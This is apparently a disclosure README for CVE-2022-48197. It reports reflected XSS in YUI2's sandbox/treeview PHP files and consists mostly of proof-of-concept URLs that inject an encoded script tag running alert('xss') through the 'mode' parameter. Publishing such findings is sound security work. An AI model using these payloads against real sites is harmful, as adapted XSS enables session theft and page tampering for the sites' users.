# CVE-2022-48197


Since Yahoo is no longer updating the project (per this announcement: https://yahooeng.tumblr.com/post/96098168666/important-announcement-regarding-yui), I've decided to disclose the vulnerabilities here:

The application has a lot of reflected XSS vulnerabilities in pretty much most files. A sample of the vulnerable files along with the exploit can be found here:

https://localhost/libs/bower/bower_components/yui2/sandbox/treeview/up.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E

https://localhost/libs/bower/bower_components/yui2/sandbox/treeview/sam.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E

https://localhost/libs/bower/bower_components/yui2/sandbox/treeview/renderhidden.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E

https://localhost/libs/bower/bower_components/yui2/sandbox/treeview/removechildren.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E

https://localhost/libs/bower/bower_components/yui2/sandbox/treeview/removeall.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E

https://localhost/libs/libs/bower/bower_components/yui2/sandbox/treeview/readd.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E

https://localhost/libs/bower/bower_components/yui2/sandbox/treeview/overflow.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E

https://localhost/libs/bower/bower_components/yui2/sandbox/treeview/newnode2.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E

https://localhost/libs/bower/bower_components/yui2/sandbox/treeview/newnode.php?mode=1%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E


